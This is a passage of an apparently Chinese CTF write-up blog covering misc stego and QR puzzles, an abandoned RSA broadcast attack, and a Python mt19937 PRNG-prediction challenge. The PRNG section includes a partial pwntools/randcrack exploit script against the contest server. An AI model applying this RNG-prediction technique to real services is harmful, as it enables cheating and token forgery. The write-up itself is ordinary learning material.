+<span class="n">PASSWORD2</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">'PASSWORD2'</span><span class="p">,</span> <span class="s1">'UEtVZXI='</span><span class="p">)</span>                      <span class="c1"># Base64: PKUer</span>
+<span class="n">FLAG_SECRET</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">'FLAG_SECRET'</span><span class="p">,</span> <span class="s1">'ZmxhZw=='</span><span class="p">)</span>                  <span class="c1"># Base64: flag</span>
+<span class="c1"># 省略一部分内容...</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">exit_gate</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">"""校门撤离点"""</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"祝贺你得到了想要的东西。按照通顺的语言习惯组合即可。不要忘记在单词之间加入短下划线_哦~"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>把三个 secret 按照语序拼接得到 <code>flag{c0mbIne_al1_w0rK}</code> （一开始我一直尝试把 <code>NJUer</code> 塞进去😰）</p>
+<h3 id="misc03-watch-the-star">Misc03-Watch the Star</h3>
+<p>提供了一个 <code>coords.txt</code> 记录了若干个点坐标，以及一个 <code>star.png</code> 绘制了部分点的位置和连线</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">coords.txt</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>6,43
+7,43
+8,43
+9,43
+10,43
+11,43
+12,43
+13,43
+# 省略更多的坐标点
+</code></pre></div></td></tr></tbody></table></div>
+<p>用 matplotlib 库绘图，发现连线没有任何线索，但是点的排布很有意思（特别是↖↗↙三个角的暗示）</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006103444602.png" data-desc-position="bottom"><img alt="image-20251006103444602" src="../../images/image-20251006103444602.png"></a></p>
+<p>把点替换成大小为1的方格，删去连线，得到：</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006104300071.png" data-desc-position="bottom"><img alt="image-20251006104300071" src="../../images/image-20251006104300071.png"></a></p>
+<p>是个二维码，扫描得到 <code>flag:bWlzY19maW5pc2g=</code>， Base64 一下得到 <code>flag{misc_finish}</code></p>
+<h3 id="misc04-unfinished"><strong>Misc04-猫猫</strong>（Unfinished）</h3>
+<p>图片里藏了一个 zip 文件用 binwalk 分离，压缩包里有 <code>flag.txt</code> 但是解压需要密码</p>
+<p>对剩下的纯图片内容 zsteg 一下发现下面的内容：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code>imagedata<span class="w">           </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">".55/4.,-)"</span>
+b1,g,lsb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"-M</span><span class="nv">$ED</span><span class="s2">%LtLm\\\\uT"</span>
+b1,b,lsb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"5m,5</span><span class="nv">$5</span><span class="s2">l4ee}----("</span>
+b2,r,lsb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"D@@EDkDD"</span>
+b2,rgb,lsb,xy<span class="w">       </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"L0DDTAA@E"</span>
+b2,rgb,msb,xy<span class="w">       </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"\n{&lt;g[6e{"</span>
+b3,g,msb,xy<span class="w">         </span>..<span class="w"> </span>file:<span class="w"> </span>OpenPGP<span class="w"> </span>Secret<span class="w"> </span>Key
+b4,r,lsb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"2222\"2R2#5TTDDTTUETFfvvvvgvvvv"</span>
+b4,r,msb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"];;;;;;{"</span>
+b4,g,lsb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"223#323323ETTEUUTggTvvggvgwgvy"</span>
+b4,b,lsb,xy<span class="w">         </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"wvfgwvvfwv"</span>
+b4,rgb,lsb,xy<span class="w">       </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"A62s&amp;3p5"</span>
+b4,rgb,msb,xy<span class="w">       </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">",Fb</span><span class="nv">$Nb$N</span><span class="s2">"</span>
+b4,bgr,lsb,xy<span class="w">       </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"QB63r6 s"</span>
+b4,bgr,msb,xy<span class="w">       </span>..<span class="w"> </span>text:<span class="w"> </span><span class="s2">"J&amp;dB.dB."</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>不会解，遂放弃</p>
+<p>（后记：压缩包的密码原来可以爆破）</p>
+<p>（赛后官方 Sol 好魔幻）</p>
+<h3 id="misc05-">Misc05-填填问卷就能拿分谢谢喵</h3>
+<p>字面意思，这我还能说什么呢，太性情了哥们，flag 没保存所以不贴了</p>
+<p>ps: 我拿的一血🤓</p>
+<hr>
+<h2 id="crypto">🔒 CRYPTO</h2>
+<h3 id="crypto01-rsa-unfinished">Crypto01-RSA (Unfinished)</h3>
+<p>一个菜单环境，提供了离线的 Python 搭建：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">task.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.number</span><span class="w"> </span><span class="kn">import</span> <span class="n">bytes_to_long</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">signal</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">utils</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="mi">600</span><span class="p">)</span>                               <span class="c1"># 600s 的限时，也就是 TLE 机制（？</span>
+<span class="k">assert</span> <span class="n">utils</span><span class="o">.</span><span class="n">PoW</span><span class="p">()</span>                              <span class="c1"># 一个需要暴力算 sha256 的工作量证明</span>
+<span class="n">sec</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+<span class="n">MENU</span> <span class="o">=</span> <span class="s1">'''</span>
+<span class="s1">[E]ncrypt</span>
+<span class="s1">[G]etFlag</span>
+<span class="s1">[Q]uit</span>
+<span class="s1">'''</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">MENU</span><span class="p">)</span>
+    <span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"q"</span><span class="p">:</span>                          <span class="c1"># q 键退出</span>
+            <span class="k">raise</span> <span class="ne">Exception</span>
+
+        <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"e"</span><span class="p">:</span>                        <span class="c1"># e 键会提供一个用相同的公钥指数 e=4027 和明文，用不同的模数加密的结果</span>
+            <span class="n">rsa</span> <span class="o">=</span> <span class="n">utils</span><span class="o">.</span><span class="n">RSA</span><span class="p">(</span><span class="n">nbits</span><span class="o">=</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="n">rsa</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">sec</span><span class="p">))</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">rsa</span><span class="o">.</span><span class="n">pub</span><span class="w"> </span><span class="si">= }</span><span class="se">\n</span><span class="si">{</span><span class="n">c</span><span class="w"> </span><span class="si">= }</span><span class="s2">"</span><span class="p">)</span>
+
+        <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"g"</span><span class="p">:</span>                        <span class="c1"># g 键用解出的明文换取 flag</span>
+            <span class="k">assert</span> <span class="n">sec</span> <span class="o">==</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">"sec&gt;"</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+            <span class="n">utils</span><span class="o">.</span><span class="n">solve</span><span class="p">()</span>
+            <span class="k">raise</span> <span class="ne">Exception</span>
+
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">break</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>赛时考虑使用 <strong>Håstad广播攻击</strong>，需要收集 4097 组数据但是被 600s 时限卡住了（600s 只能收集 1k 组不到的数据，而 1k 组数据破解的概率太低了），遂 giveup</p>
+<p><strong>Crypto02-PQC</strong>  和 <strong>Crypto03-ECC</strong> 都没碰，不会离散数学</p>
+<h3 id="crypto04-prng">Crypto04-PRNG</h3>
+<p>四道 Crypto 的环境搭建都是相似的：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">task.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">signal</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">utils</span>
+
+<span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="mi">600</span><span class="p">)</span>
+<span class="k">assert</span> <span class="n">utils</span><span class="o">.</span><span class="n">PoW</span><span class="p">()</span>
+
+<span class="n">casino</span> <span class="o">=</span> <span class="n">utils</span><span class="o">.</span><span class="n">CASINO</span><span class="p">()</span>                                         <span class="c1"># 构建了一个 casino 猜数游戏</span>
+                                                                <span class="c1"># 初始有一定的分数</span>
+<span class="n">MENU</span> <span class="o">=</span> <span class="s1">'''</span>
+<span class="s1">[R]efresh</span>
+<span class="s1">[H]it</span>
+<span class="s1">[S]tand</span>
+<span class="s1">[Q]uit</span>
+<span class="s1">'''</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">MENU</span><span class="p">)</span>
+    <span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"q"</span><span class="p">:</span>                                          <span class="c1"># q 键退出游戏</span>
+            <span class="k">raise</span> <span class="ne">Exception</span>
+
+        <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"r"</span><span class="p">:</span>                                        <span class="c1"># r 键重置游戏</span>
+            <span class="n">casino</span><span class="o">.</span><span class="n">refresh</span><span class="p">()</span>
+
+        <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"h"</span><span class="p">:</span>                                        <span class="c1"># h 键进行猜数，要猜的数是随机数</span>
+            <span class="n">card</span> <span class="o">=</span> <span class="n">casino</span><span class="o">.</span><span class="n">card</span><span class="p">()</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">card</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">"check&gt;"</span><span class="p">)):</span>
+                <span class="n">casino</span><span class="o">.</span><span class="n">score</span> <span class="o">+=</span> <span class="mi">1</span>                               <span class="c1"># 猜对了加一分</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">"Positive"</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">casino</span><span class="o">.</span><span class="n">score</span> <span class="o">-=</span> <span class="mi">2</span>                               <span class="c1"># 猜错了扣两分</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">"Negative"</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">card</span><span class="w"> </span><span class="si">= }</span><span class="s2">"</span><span class="p">)</span>                             <span class="c1"># 并且会告知正确的数是什么</span>
+
+        <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">"s"</span><span class="p">:</span>                                        <span class="c1"># 在得分 ≥ 9999 时按下 s 键获得 Flag</span>
+            <span class="k">assert</span> <span class="n">casino</span><span class="o">.</span><span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">9999</span>
+            <span class="n">utils</span><span class="o">.</span><span class="n">solve</span><span class="p">()</span>
+            <span class="k">raise</span> <span class="ne">Exception</span>
+
+        <span class="k">assert</span> <span class="n">casino</span><span class="o">.</span><span class="n">score</span> <span class="o">&gt;</span> <span class="mi">0</span>                                 <span class="c1"># 分数归零时退出游戏</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">break</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>目前掌握的信息不够，所以我们需要在另一个下发的文件中获取更多信息：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">utils.py（节选）</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">CASINO</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>                                         <span class="c1"># 初始化</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>                               <span class="c1"># 生成一个密钥 key</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">rng</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">Random</span><span class="p">()</span>                              <span class="c1"># 创建一个随机数生成器</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">refresh</span><span class="p">()</span>                                          <span class="c1"># 进行一次刷新操作</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">refresh</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>                                          <span class="c1"># 刷新操作</span>
+        <span class="n">seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mf">0.93</span><span class="p">))</span>                      <span class="c1"># 基于当前时间的种子 seed（一个伏笔）</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">rng</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="n">seed</span><span class="p">)</span>           <span class="c1"># 随机数生成器基于 key + seed 生成新的生成器种子</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">score</span> <span class="o">=</span> <span class="mh">0x4c4</span>                                      <span class="c1"># 初始分数为 610 * 2 分</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">card</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>                                             <span class="c1"># 发牌操作</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">rng</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>                         <span class="c1"># 利用随机数生成器生成一个 32 位随机数</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p><code>random.Random()</code> 说明程序使用了 Python 自带了的随机数计算：伪随机数生成器 mt19937。</p>
+<p>这个随机数算法对于相同的种子总会给出相同的输出结果，且算法上可以逆向实现随机数预测，前提是先要获取<strong>连续的 624 个 32 位</strong>的已生成的随机数（这么多的数据足够找到循环点），这里考虑使用 <code>randcrack</code> 库</p>
+<p>然而，初始分数 <code>610 * 2</code> ，但是 624 次错误的猜数会扣除 <code>624 * 2</code> 的分数，所以我没有办法连续猜错 624 次，必须要猜对若干次</p>
+<p>在观察了四道 Crypto 题目的框架后，我发现只有第四题提供了重置操作 <code>r</code>。为什么要提供一个 <code>r</code> 键重置？虽然 <code>r</code> 键可以重置得分，但是也会重置 <code>self.rng.seed</code>，也就是随机数生成器的种子，看上去 <code>r</code> 操作没有作用</p>
+<blockquote>
+<p>除非 <code>r</code> 操作并不是一定会重置随机数生成器的种子？</p>
+</blockquote>
+<p>仔细看一下随机数生成器的种子是如何被计算的：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mf">0.93</span><span class="p">))</span>              <span class="c1"># (int)(时间戳 ^ 0.93)</span>
+<span class="bp">self</span><span class="o">.</span><span class="n">rng</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="n">seed</span><span class="p">)</span>   <span class="c1"># key + seed，其中 key 不会随着 r 操作改变，改变 seed</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>对于 <code>(int)(时间戳 ^ 0.93)</code> 这一步，我们不难发现，当两个时间戳非常接近时，计算得到的种子是完全相同的</p>
+<blockquote>
+<p>比如我现在查询时间戳得到的数值是 <code>1759734250</code>，不难计算</p>
+<p><code>(int)1759734250^0.93 == (int)1759734252^0.93 == 396520633</code>，得到了 3s 的窗口期</p>
+<p>如果刷新的时间恰当，<strong>最大可以争取约 5s 的窗口期</strong>，这段时间内的 <code>r</code> 刷新操作不会改变 <code>seed</code> 值</p>
+</blockquote>
+<p>于是我们得到了一个自动化方案：</p>
+<ol>
+<li>解决 PoW 问题（写一段暴力计算的程序即可）</li>
+<li>先答错获取前十个随机数，保存（这里的十次实际上可以更少一些，这取决于网速）</li>
+<li><code>r</code> 刷新一次</li>
+<li>用之前获取的前十个随机数去回答前十次猜数问题（不会扣分，而且会加分）</li>
+<li>继续猜错直到获取了 624 个随机数（可以保证分数不会减到 0 以下）</li>
+<li>现在 mt19937 的随机数可以完全预测了，持续猜对数字直到分数超过 9999</li>
+<li><code>s</code> 获取 Flag！</li>
+</ol>
+<p>用 AI 辅助写了一段自动化的 Python 程序（<del>我不会 Python</del>）</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><th colspan="2" class="filename"><span class="filename">exp.py</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
+<span class="normal">  2</span>
+<span class="normal">  3</span>
+<span class="normal">  4</span>
+<span class="normal">  5</span>
+<span class="normal">  6</span>
+<span class="normal">  7</span>
+<span class="normal">  8</span>
+<span class="normal">  9</span>
+<span class="normal"> 10</span>
+<span class="normal"> 11</span>
+<span class="normal"> 12</span>
+<span class="normal"> 13</span>
+<span class="normal"> 14</span>
+<span class="normal"> 15</span>
+<span class="normal"> 16</span>
+<span class="normal"> 17</span>
+<span class="normal"> 18</span>
+<span class="normal"> 19</span>
+<span class="normal"> 20</span>
+<span class="normal"> 21</span>
+<span class="normal"> 22</span>
+<span class="normal"> 23</span>
+<span class="normal"> 24</span>
+<span class="normal"> 25</span>
+<span class="normal"> 26</span>
+<span class="normal"> 27</span>
+<span class="normal"> 28</span>
+<span class="normal"> 29</span>
+<span class="normal"> 30</span>
+<span class="normal"> 31</span>
+<span class="normal"> 32</span>
+<span class="normal"> 33</span>
+<span class="normal"> 34</span>
+<span class="normal"> 35</span>
+<span class="normal"> 36</span>
+<span class="normal"> 37</span>
+<span class="normal"> 38</span>
+<span class="normal"> 39</span>
+<span class="normal"> 40</span>
+<span class="normal"> 41</span>
+<span class="normal"> 42</span>
+<span class="normal"> 43</span>
+<span class="normal"> 44</span>
+<span class="normal"> 45</span>
+<span class="normal"> 46</span>
+<span class="normal"> 47</span>
+<span class="normal"> 48</span>
+<span class="normal"> 49</span>
+<span class="normal"> 50</span>
+<span class="normal"> 51</span>
+<span class="normal"> 52</span>
+<span class="normal"> 53</span>
+<span class="normal"> 54</span>
+<span class="normal"> 55</span>
+<span class="normal"> 56</span>
+<span class="normal"> 57</span>
+<span class="normal"> 58</span>
+<span class="normal"> 59</span>
+<span class="normal"> 60</span>
+<span class="normal"> 61</span>
+<span class="normal"> 62</span>
+<span class="normal"> 63</span>
+<span class="normal"> 64</span>
+<span class="normal"> 65</span>
+<span class="normal"> 66</span>
+<span class="normal"> 67</span>
+<span class="normal"> 68</span>
+<span class="normal"> 69</span>
+<span class="normal"> 70</span>
+<span class="normal"> 71</span>
+<span class="normal"> 72</span>
+<span class="normal"> 73</span>
+<span class="normal"> 74</span>
+<span class="normal"> 75</span>
+<span class="normal"> 76</span>
+<span class="normal"> 77</span>
+<span class="normal"> 78</span>
+<span class="normal"> 79</span>
+<span class="normal"> 80</span>
+<span class="normal"> 81</span>
+<span class="normal"> 82</span>
+<span class="normal"> 83</span>
+<span class="normal"> 84</span>
+<span class="normal"> 85</span>
+<span class="normal"> 86</span>
+<span class="normal"> 87</span>
+<span class="normal"> 88</span>
+<span class="normal"> 89</span>
+<span class="normal"> 90</span>
+<span class="normal"> 91</span>
+<span class="normal"> 92</span>
+<span class="normal"> 93</span>
+<span class="normal"> 94</span>
+<span class="normal"> 95</span>
+<span class="normal"> 96</span>
+<span class="normal"> 97</span>
+<span class="normal"> 98</span>
+<span class="normal"> 99</span>
+<span class="normal">100</span>
+<span class="normal">101</span>
+<span class="normal">102</span>
+<span class="normal">103</span>
+<span class="normal">104</span>
+<span class="normal">105</span>
+<span class="normal">106</span>
+<span class="normal">107</span>
+<span class="normal">108</span>
+<span class="normal">109</span>
+<span class="normal">110</span>
+<span class="normal">111</span>
+<span class="normal">112</span>
+<span class="normal">113</span>
+<span class="normal">114</span>
+<span class="normal">115</span>
+<span class="normal">116</span>
+<span class="normal">117</span>
+<span class="normal">118</span>
+<span class="normal">119</span>
+<span class="normal">120</span>
+<span class="normal">121</span>
+<span class="normal">122</span>
+<span class="normal">123</span>
+<span class="normal">124</span>
+<span class="normal">125</span>
+<span class="normal">126</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">randcrack</span><span class="w"> </span><span class="kn">import</span> <span class="n">RandCrack</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">solve_pow</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
+    <span class="c1"># 爆破 XXXX</span>
+    <span class="k">for</span> <span class="n">comb</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">length</span><span class="p">):</span>
+        <span class="n">attempt</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
+        <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">attempt</span> <span class="o">+</span> <span class="n">prefix</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">h</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">attempt</span>
+    <span class="k">return</span> <span class="kc">None</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># 连接信息：</span>
+    <span class="c1"># xxx.xxx.xxx.xx:xxxxx</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">'123.456.789.01'</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">12345</span>
+
+    <span class="c1"># 第一步：接收 PoW 题目</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'= '</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">target_hash</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">prefix</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'+'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">')'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># 提取 iMwfwaWvfBil7B9S 这样的后缀</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"PoW: sha256(XXXX+</span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s2">) = </span><span class="si">{</span><span class="n">target_hash</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
